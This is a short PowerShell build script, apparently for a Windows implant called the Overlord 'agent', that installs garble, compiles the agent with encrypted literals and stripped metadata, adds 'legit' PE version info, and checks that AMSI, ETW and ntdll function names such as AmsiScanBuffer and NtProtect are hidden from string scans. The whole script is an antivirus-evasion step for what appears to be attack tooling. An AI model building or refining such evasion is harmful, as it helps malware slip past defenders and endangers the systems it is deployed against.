# build_obf.ps1 — obfuscated agent build using garble
# Run from the Overlord-Client directory (where go.mod lives).
# Requires Go 1.21+ and network access on first run (downloads garble).

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

$outBinary = "agent_obf.exe"

# Install garble if not present
if (-not (Get-Command garble -ErrorAction SilentlyContinue)) {
    Write-Host "[*] garble not found, installing..."
    go install mvdan.cc/garble@master
    if ($LASTEXITCODE -ne 0) { throw "garble install failed" }
}

# Install goversioninfo if not present
if (-not (Get-Command goversioninfo -ErrorAction SilentlyContinue)) {
    Write-Host "[*] goversioninfo not found, installing..."
    go install github.com/josephspurrier/goversioninfo/cmd/goversioninfo@latest
    if ($LASTEXITCODE -ne 0) { throw "goversioninfo install failed" }
}

# Generate VERSIONINFO resource (.syso) so the binary has legit PE metadata
Write-Host "[*] Generating VERSIONINFO resource..."
Push-Location cmd\agent
goversioninfo -o resource.syso versioninfo.json
if ($LASTEXITCODE -ne 0) { throw "goversioninfo failed" }
Pop-Location

Write-Host "[*] Building obfuscated agent -> $outBinary"

# -literals  encrypts all string/numeric literals at compile time
# -tiny      strips filenames, line numbers, and type info from the binary
# -seed=random generates a fresh per-build randomisation seed
$env:GOARCH = "amd64"
$env:GOOS   = "windows"

garble -literals -tiny -seed=random build -trimpath -ldflags="-s -w" -o $outBinary ./cmd/agent

if ($LASTEXITCODE -ne 0) { throw "garble build failed" }

Write-Host "[+] Build complete: $outBinary"
Write-Host "[*] Running strings check (should show no AMSI/ETW/ntdll literals)..."

# Quick sanity check with strings utility if available
$stringsExe = Get-Command strings -ErrorAction SilentlyContinue
if ($stringsExe) {
    $hits = & strings $outBinary | Select-String -Pattern "AmsiScanBuffer|EtwEventWrite|NtProtect|NtWrite|amsi.dll" -CaseSensitive
    if ($hits) {
        Write-Warning "Potential plaintext strings found:"
        $hits | ForEach-Object { Write-Warning "  $_" }
    } else {
        Write-Host "[+] No sensitive plaintext strings detected."
    }
} else {
    Write-Host "[!] 'strings' utility not found — skipping plaintext check."
    Write-Host "    Install Sysinternals Strings or run: strings64.exe $outBinary | findstr /i amsi"
}
